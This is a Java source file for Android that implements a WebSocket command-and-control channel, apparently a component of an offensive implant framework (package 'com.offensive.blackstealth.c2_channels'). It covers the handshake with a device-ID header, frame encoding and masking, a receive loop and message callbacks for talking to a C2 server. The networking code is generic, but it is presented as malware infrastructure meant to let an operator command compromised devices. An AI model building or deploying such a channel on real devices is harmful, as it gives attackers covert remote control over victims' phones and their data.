package com.offensive.blackstealth.c2_channels;

import android.util.Base64;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.security.*;
import java.util.*;
import java.util.concurrent.*;
import javax.net.ssl.*;

/**
 * WebSocket C2 Channel
 * Real-time bidirectional communication with C2 server
 */
public class WebSocketC2 {
    private static final String TAG = "WebSocketC2";
    private static final int OPCODE_TEXT = 0x1;
    private static final int OPCODE_BINARY = 0x2;
    private static final int OPCODE_CLOSE = 0x8;
    private static final int OPCODE_PING = 0x9;
    private static final int OPCODE_PONG = 0xA;
    
    private String wsUrl;
    private Socket socket;
    private InputStream inputStream;
    private OutputStream outputStream;
    private ExecutorService executor;
    private boolean isConnected = false;
    private boolean isRunning = false;
    private String deviceId;
    private Random random;
    private MessageCallback callback;
    
    public interface MessageCallback {
        void onMessage(String message);
        void onBinaryMessage(byte[] data);
        void onConnected();
        void onDisconnected();
        void onError(String error);
    }
    
    public WebSocketC2(String wsUrl, String deviceId) {
        this.wsUrl = wsUrl;
        this.deviceId = deviceId;
        this.executor = Executors.newFixedThreadPool(3);
        this.random = new SecureRandom();
    }
    
    public void setCallback(MessageCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Connect to WebSocket server
     */
    public void connect() {
        executor.submit(() -> {
            try {
                performHandshake();
                isConnected = true;
                isRunning = true;
                
                if (callback != null) callback.onConnected();
                
                // Start receiver loop
                receiveLoop();
                
            } catch (Exception e) {
                Log.e(TAG, "Connection failed: " + e.getMessage());
                if (callback != null) callback.onError(e.getMessage());
            }
        });
    }
    
    /**
     * Disconnect from WebSocket server
     */
    public void disconnect() {
        isRunning = false;
        isConnected = false;
        
        try {
            if (socket != null) {
                sendFrame(OPCODE_CLOSE, new byte[0]);
                socket.close();
            }
        } catch (Exception e) {}
        
        if (callback != null) callback.onDisconnected();
    }
    
    /**
     * Send text message
     */
    public void sendText(String message) {
        if (!isConnected) return;
        
        executor.submit(() -> {
            try {
                sendFrame(OPCODE_TEXT, message.getBytes("UTF-8"));
            } catch (Exception e) {
                Log.e(TAG, "Send failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Send binary message
     */
    public void sendBinary(byte[] data) {
        if (!isConnected) return;
        
        executor.submit(() -> {
            try {
                sendFrame(OPCODE_BINARY, data);
            } catch (Exception e) {
                Log.e(TAG, "Send failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Perform WebSocket handshake
     */
    private void performHandshake() throws Exception {
        URI uri = new URI(wsUrl);
        String host = uri.getHost();
        int port = uri.getPort();
        boolean isSecure = wsUrl.startsWith("wss://");
        
        if (port == -1) {
            port = isSecure ? 443 : 80;
        }
        
        // Create socket
        if (isSecure) {
            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, null, new SecureRandom());
            socket = sslContext.getSocketFactory().createSocket(host, port);
        } else {
            socket = new Socket(host, port);
        }
        
        socket.setSoTimeout(0); // No timeout for WebSocket
        inputStream = socket.getInputStream();
        outputStream = socket.getOutputStream();
        
        // Generate WebSocket key
        byte[] keyBytes = new byte[16];
        random.nextBytes(keyBytes);
        String wsKey = Base64.encodeToString(keyBytes, Base64.NO_WRAP);
        
        // Build handshake request
        String path = uri.getPath();
        if (path == null || path.isEmpty()) path = "/";
        if (uri.getQuery() != null) path += "?" + uri.getQuery();
        
        StringBuilder request = new StringBuilder();
        request.append("GET ").append(path).append(" HTTP/1.1\r\n");
        request.append("Host: ").append(host);
        if (port != 80 && port != 443) request.append(":").append(port);
        request.append("\r\n");
        request.append("Upgrade: websocket\r\n");
        request.append("Connection: Upgrade\r\n");
        request.append("Sec-WebSocket-Key: ").append(wsKey).append("\r\n");
        request.append("Sec-WebSocket-Version: 13\r\n");
        request.append("X-Device-ID: ").append(deviceId).append("\r\n");
        request.append("\r\n");
        
        outputStream.write(request.toString().getBytes());
        outputStream.flush();
        
        // Read response
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        String line = reader.readLine();
        
        if (line == null || !line.contains("101")) {
            throw new IOException("WebSocket handshake failed: " + line);
        }
        
        // Skip headers
        while ((line = reader.readLine()) != null && !line.isEmpty());
        
        Log.i(TAG, "WebSocket connected to " + host);
    }
    
    /**
     * Receive loop
     */
    private void receiveLoop() {
        while (isRunning && isConnected) {
            try {
                int firstByte = inputStream.read();
                if (firstByte == -1) break;
                
                boolean fin = (firstByte & 0x80) != 0;
                int opcode = firstByte & 0x0F;
                
                int secondByte = inputStream.read();
                boolean masked = (secondByte & 0x80) != 0;
                int payloadLength = secondByte & 0x7F;
                
                // Extended payload length
                if (payloadLength == 126) {
                    payloadLength = (inputStream.read() << 8) | inputStream.read();
                } else if (payloadLength == 127) {
                    // 8-byte length (not fully implemented for simplicity)
                    byte[] lenBytes = new byte[8];
                    inputStream.read(lenBytes);
                    payloadLength = (int) ByteBuffer.wrap(lenBytes).getLong();
                }
                
                // Read mask if present
                byte[] mask = null;
                if (masked) {
                    mask = new byte[4];
                    inputStream.read(mask);
                }
                
                // Read payload
                byte[] payload = new byte[payloadLength];
                int read = 0;
                while (read < payloadLength) {
                    int r = inputStream.read(payload, read, payloadLength - read);
                    if (r == -1) break;
                    read += r;
                }
                
                // Unmask if needed
                if (masked && mask != null) {
                    for (int i = 0; i < payload.length; i++) {
                        payload[i] ^= mask[i % 4];
                    }
                }
                
                // Handle frame
                handleFrame(opcode, payload);
                
            } catch (Exception e) {
                if (isRunning) {
                    Log.e(TAG, "Receive error: " + e.getMessage());
                    if (callback != null) callback.onError(e.getMessage());
                }
                break;
            }
        }
        
        isConnected = false;
        if (callback != null) callback.onDisconnected();
    }
    
    /**
     * Handle received frame
     */
    private void handleFrame(int opcode, byte[] payload) {
        switch (opcode) {
            case OPCODE_TEXT:
                if (callback != null) {
                    callback.onMessage(new String(payload));
                }
                break;
                
            case OPCODE_BINARY:
                if (callback != null) {
                    callback.onBinaryMessage(payload);
                }
                break;
                
            case OPCODE_PING:
                // Respond with pong
                try {
                    sendFrame(OPCODE_PONG, payload);
                } catch (Exception e) {}
                break;
                
            case OPCODE_CLOSE:
                disconnect();
                break;
        }
    }
    
    /**
     * Send WebSocket frame
     */
    private synchronized void sendFrame(int opcode, byte[] payload) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        
        // First byte: FIN + opcode
        baos.write(0x80 | opcode);
        
        // Generate mask
        byte[] mask = new byte[4];
        random.nextBytes(mask);
        
        // Payload length + mask bit
        if (payload.length < 126) {
            baos.write(0x80 | payload.length);
        } else if (payload.length < 65536) {
            baos.write(0x80 | 126);
            baos.write((payload.length >> 8) & 0xFF);
            baos.write(payload.length & 0xFF);
        } else {
            baos.write(0x80 | 127);
            for (int i = 7; i >= 0; i--) {
                baos.write((payload.length >> (i * 8)) & 0xFF);
            }
        }
        
        // Write mask
        baos.write(mask);
        
        // Mask and write payload
        byte[] maskedPayload = new byte[payload.length];
        for (int i = 0; i < payload.length; i++) {
            maskedPayload[i] = (byte)(payload[i] ^ mask[i % 4]);
        }
        baos.write(maskedPayload);
        
        outputStream.write(baos.toByteArray());
        outputStream.flush();
    }
    
    public boolean isConnected() {
        return isConnected;
    }
}
